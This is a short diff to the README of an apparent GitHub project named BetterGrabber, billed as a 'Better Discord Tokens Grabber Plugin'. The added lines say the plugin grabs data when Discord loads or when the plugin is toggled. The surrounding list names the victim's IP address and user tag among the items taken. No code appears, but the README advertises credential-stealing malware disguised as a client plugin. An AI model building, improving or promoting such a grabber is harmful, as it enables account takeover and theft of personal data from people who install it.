@@ -3,6 +3,10 @@
 [![](https://www.codefactor.io/repository/github/HideakiAtsuyo/BetterGrabber/badge)](https://www.codefactor.io/repository/github/HideakiAtsuyo/BetterGrabber)<br>
 Better Discord Tokens Grabber Plugin
 
+# Grab When
+- Load Discord
+- Enable the Plugin if you modify the state (enabled/disabled)
+
 # Infos
 - IP
 - User Tag (Username + Discriminator)
